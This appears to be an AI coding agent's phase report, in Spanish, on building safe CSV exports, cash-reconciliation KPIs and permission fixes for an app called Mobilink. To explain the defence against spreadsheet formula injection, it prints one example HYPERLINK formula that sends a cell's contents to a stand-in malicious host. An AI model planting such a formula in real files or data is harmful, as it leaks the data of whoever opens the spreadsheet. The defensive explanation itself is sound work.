# Fase 16 — Entrega: informes, exportaciones seguras y KPIs

- **Rama:** `claude/mobilink-central-cash-uqk7t9` · **Versión:** `1.8.40`

## Corrección importante sobre lo que llevo diciendo

**`server/central` no se estaba typechequeando.** `tsconfig.server.json` incluía solo
`server/connect` y `server/cash`, así que durante diez fases `npx tsc` contestaba «correcto» sin
haber mirado ni una línea del módulo que estaba construyendo. Mis verificaciones de las fases 3 a 15
eran, en ese punto, más débiles de lo que dije.

Lo destapó un `import` que faltaba. Al ampliar el `include` aparecieron **cuatro errores, y dos
habrían reventado en producción**:

| Error | Consecuencia |
|---|---|
| `jornadasDeRed` no existe (es `jornadasEnRed`) | **La API de programas de la fase 12 no habría podido ni importarse** |
| `registrarAuditoria` sin importar | La exportación habría fallado al ejecutarse |
| `e.status` en vez de `e.estado` | **Todos los errores de negocio de Central salían como 500** en vez de su 4xx |
| `req.centralCentroId` no existía | La exportación **no se recortaba al ámbito** pese a decir que sí |

Un typecheck que no incluye lo que estás escribiendo es peor que no tenerlo, porque da confianza. Ya
está ampliado, y en cero errores.

## Exportación: qué significa «segura»

**Excel ejecuta las celdas que empiezan por `=`, `+`, `-` o `@`.** Eso convierte un campo de texto
escrito por un usuario en código que corre en el ordenador de quien abre el fichero:

    =HYPERLINK("http://sitio.malo/?d="&A1;"Haz clic")

En Mobilink hay varios campos así —el concepto de un cobro, el nombre de un cliente, el motivo de una
anulación— y todos acaban en un informe que alguien abre en su portátil. Se llama inyección de
fórmulas, y es la razón de que exista un módulo de CSV en vez de un `join`.

Otras tres decisiones del mismo fichero:

- **El apóstrofo va DENTRO de las comillas.** Fuera, Excel volvería a ver la fórmula.
- **Se entrecomilla por el separador `;`, no por la coma.** Los importes llevan coma decimal, así que
  entrecomillar por comas los envolvería a todos — y **una celda entrecomillada la lee Excel como
  texto, con lo que la columna de importes deja de sumar**. Lo cazó una prueba.
- **Lleva BOM**, o Excel abre el fichero en la codificación del sistema y los acentos salen rotos.

Y lo que hace segura la exportación más allá del formato: **se recorta al ámbito de quien exporta** y
**queda auditada**. Un fichero descargado se reenvía, y sería la vía más fácil para que alguien
limitado a un taller acabara con los datos de toda la red.

## KPIs: cinco, y pocos a propósito

Un panel con veinte números no lo mira nadie: se convierte en decoración.

| Indicador | Qué contesta |
|---|---|
| Jornadas cerradas | El volumen del periodo |
| Efectivo por caja | Lo que ha entrado |
| **Descuadre, en valor absoluto** | Lo que no cuadró |
| Jornadas con descuadre | Si es un caso o es un patrón |
| **Días hasta el banco** | Dinero parado en un cajón |

**El descuadre se suma en valor absoluto**, y es la decisión que más importa: un día que sobran 20 €
y otro que faltan 20 € no son una red que cuadra, son dos días que no cuadraron. Sumarlos con signo
daría cero y escondería justo lo que el indicador viene a enseñar.

**Los días hasta el banco solo cuentan las jornadas ya conciliadas.** Una cuyo dinero sigue sin
ingresar no tiene un plazo todavía, y contarla como cero rebajaría la media por el caso que peor está.

## De paso: la caché de permisos de Central

Seguía teniendo la de 60 segundos que se quitó en Mobilink Cash en la fase 10, por las mismas razones
que allí: los roles se escriben desde el navegador, el servidor no se entera, y en Render hay varias
instancias. Fuera.

## Verificación

| Comprobación | Resultado |
|---|---|
| CSV y KPIs (unitarias, sin BD) | **9 / 9** |
| Suite completa, base **migrada** y **recién creada** | **1239 / 1239** en las dos |
| `npx tsc` **incluyendo ya `server/central`** | **0 errores** |
| `npm run build` | Correcto |
| ESLint | Sin avisos |

## Lo que queda

- **Pantalla de informes**: la API está (`/kpis`, `/reports/sessions.csv`); falta la vista con el
  selector de fechas y el botón de descargar.
- **Exportar operaciones**, no solo jornadas.
- **XLSX** en vez de CSV para quien lo prefiera: el proyecto ya trae la librería `xlsx`.
